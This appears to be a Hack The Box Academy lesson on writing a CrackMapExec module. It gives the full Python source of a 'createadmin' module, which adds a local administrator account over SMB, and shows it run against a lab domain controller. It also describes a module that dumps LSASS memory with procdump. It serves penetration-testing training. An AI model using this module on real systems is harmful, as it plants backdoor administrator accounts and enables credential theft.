# Creating Our Own CME Module

We have used many built-in CrackMapExec modules created by the authors and the community. This section will explore how we can do our module for CrackMapExec.

***

## Compile CrackMapExec with Poetry

Before building our module, it is crucial to know how to compile the CrackMapExec project. For that purpose, CME uses [Poetry](https://python-poetry.org/), which is recommended when building our projects. If you are not using [Poetry](https://python-poetry.org/), take a look at the section [Installation & Binaries](https://academy.hackthebox.com/module/84/section/797) to start using Poetry to run CrackMapExec.

Now we can open the code with our favorite IDE. In this section, we will use [VSCode](https://code.visualstudio.com/). To install VSCode, we need to download the .deb file from their [website](https://code.visualstudio.com/download). The direct download link is [here](https://code.visualstudio.com/sha/download?build=stable\&os=linux-deb-x64).

### **Installing and Running VSCode**

```shell-session
al1abb@htb[/htb]$ wget "https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64" -O vscode.deb -q
al1abb@htb[/htb]$ sudo dpkg -i vscode.deb

Selecting previously unselected package code.
(Reading database ... 560441 files and directories currently installed.)
Preparing to unpack vscode.deb ...
Unpacking code (1.73.1-1667967334) ...
Setting up code (1.73.1-1667967334) ...
Processing triggers for desktop-file-utils (0.26-1) ...
Processing triggers for bamfdaemon (0.5.4-2) ...
Rebuilding /usr/share/applications/bamf-2.index...
Processing triggers for mailcap (3.69) ...
Processing triggers for shared-mime-info (2.0-1) ...
```

We can then type `code` to open it.

```shell-session
$ code
```

{% embed url="https://academy.hackthebox.com/storage/modules/84/vscode.jpg" %}

***

## Create Our New Module

Let's create our module. We will build a simple script that will create a new administrator account.

1. Create a file under the `./CrackMapExec/cme/modules` folder named `createadmin.py`.
2. Copy the following code example into the file:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# from .... import ....

class CMEModule:

    name = 'name_module'
    description = "description"
    supported_protocols = ['smb','mssql', 'etc']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        MYOPTION    description 
        MYOPTION2   description2
        '''
    # when the user is connected but not the admin of the target
    # user cannot execute a system command, but it can be useful for pass policy, share, Kerberoastable accounts, etc
    def on_login(self, context, connection):

    # when the user is connected and the admin of the target  
    # user can execute a system command
    def on_admin_login(self, context, connection):

        # command = ''
        # context.log.info('Executing command')
        # p = connection.execute(command, True)
        #context.log.highlight(p)
```

3. Now, let us customize our module.

We need to define some variables:

* `name` is how we will call the module name. In this case, we will use the filename `createadmin`.
* `description` is a short description for the module purpose. We will set it as `Create a new administrator account`.
* `supported_protocols` is an array of the protocol supported to use the module. We will only use `SMB`.
* `opsec_safe` is a True or False value meaning that the module is safe to run.
* `multiple_hosts` means we can run this module against multiple targets.

We will also have the method `options()`, which is used to define variables for the module. In this case, we will include two options, `USER` and `PASS`. Each option can have its default value or not. That's up to the author. We will set the default value for `USER` as `plaintext` and the default value for `PASS` as `HackTheBoxCME!`. We also added a check to confirm if the module option USER o PASS is empty. If that's the case, it will exit.

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# from .... import ....

class CMEModule:
    '''
        Created to teach HackTheBox Academy students how to create a module for CrackMapExec
        Reference: https://academy.hackthebox.com/

        Module by @juliourena 
    '''

    name = 'createadmin'
    description = "Create a new administrator account"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        USER    Choose a username for the administrator account. Default: plaintext
        PASS    Choose a password for the administrator. Default: HackTheBoxCME1337!
        '''

        self.user = "plaintext"
        if 'USER' in module_options:
            if module_options['USER'] == "":
                context.log.error('Invalid value for USER option!')
                exit(1)
            self.user = module_options['USER']

        self.password = "HackTheBoxCME1337!"
        if 'PASS' in module_options:
            if module_options['PASS'] == "":
                context.log.error('Invalid value for PASS option!')
                exit(1)
            self.password = module_options['PASS']

    def on_admin_login(self, context, connection):
        ...SNIP...
```

4. Next, we will work with the execution using the method `on_admin_login()`. This method is responsible for taking our variables and executing any task we want to the targets. We will use the `context.log.info` and `context.log.highlight` methods as output (they have different colors).

For this execution, we will run a `cmd.exe` command using the method's `connection.execute(command, True)`. Our command will be saved in the variable `command` with the value `net user username password /add /Y` to add a new user and the value `net localgroup administrators username /add` to add the user to the group administrators.

```python
...SNIP...

def on_admin_login(self, context, connection):
    context.log.info('Creating user with the following values: USER {} and PASS {}'.format(self.user,self.password))
    command = '(net user ' + self.user + ' "' + self.password + '" /add /Y && net localgroup administrators ' + self.user + ' /add)'
    context.log.info('Executing command')
    p = connection.execute(command, True)
    context.log.highlight(p)
```

Finally, our new module should look like this:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

class CMEModule:
    '''
        Created to teach HackTheBox Academy students how to create a module for CrackMapExec
        Reference: https://academy.hackthebox.com/

        Module by @juliourena 
    '''

    name = 'createadmin'
    description = "Create a new administrator account"
    supported_protocols = ['smb']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        USER    Choose a username for the administrator account. Default: plaintext
        PASS    Choose a password for the administrator. Default: HackTheBoxCME1337!
        '''

        self.user = "plaintext"
        if 'USER' in module_options:
            if module_options['USER'] == "":
                context.log.error('Invalid value for USER option!')
                exit(1)
            self.user = module_options['USER']

        self.password = "HackTheBoxCME1337!"
        if 'PASS' in module_options:
            if module_options['PASS'] == "":
                context.log.error('Invalid value for PASS option!')
                exit(1)
            self.password = module_options['PASS']

    def on_admin_login(self, context, connection):
        context.log.info('Creating user with the following values: USER {} and PASS {}'.format(self.user,self.password))
        command = '(net user ' + self.user + ' "' + self.password + '" /add /Y && net localgroup administrators ' + self.user + ' /add)'
        context.log.info('Executing command')
        p = connection.execute(command, True)
        context.log.highlight(p)
```

***

## Running Our Module

Now we can run our module with or without any options. Let's see the results, first running it with the defaults.

### **Running Our CME Module createadmin**

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M createadmin 

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
CREATEAD... 10.129.203.121  445    DC01             [*] Creating user with the following values: USER plaintext and PASS HackTheBoxCME1337!
CREATEAD... 10.129.203.121  445    DC01             [*] Executing command
CREATEAD... 10.129.203.121  445    DC01             The command completed successfully.

The command completed successfully.
```

Next, we can run it by specifying both a username and password.

```shell-session
$ crackmapexec smb 10.129.203.121 -u julio -p Password1 -M createadmin -o USER=htb PASS=Newpassword!
SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\julio:Password1 (Pwn3d!)
CREATEAD... 10.129.203.121  445    DC01             [*] Creating user with the following values: USER htb and PASS Newpassword!
CREATEAD... 10.129.203.121  445    DC01             [*] Executing command
CREATEAD... 10.129.203.121  445    DC01             The command completed successfully.

The command completed successfully.
```

We have our first module working, but it could be much better. We could split the execution into two commands and show an error if the user is already created or the password does not comply with the policies.

We can also take the value from `context.log.highlight(p)` and show something different if there is an error. What are your ideas to improve this code?

There will always be different ways of doing things. Explore what you would change in this module and how you would do it better. Further customizing this module is a great place to start creating your own modules.

***

## Learning from Other Authors

Now that we learned the basics of creating a new module, we should explore other modules and get a few ideas out.

For example, the module `procdump.py` saves the `procdump.exe` executable as a Base64 string, then converts the Base64 string to a file and keeps it in the target operating system. It executes the command `tasklist` to retrieve the process id of `LSASS`, save it to a variable, and passes the process id as an argument to the execution of procdump.exe.

Another example is `get_description.py`. We took that module as an example to build the `groupmembership` module. That module gets its results based on an LDAP query, the same as we needed to perform a query and retrieve the attribute `memberOf`. We made some changes in the code, created a new module, and submitted a pull request. Once the pull request gets accepted will be available to the whole community.

We can also look at other examples for other protocols, such as `MSSQL`, to create new modules.
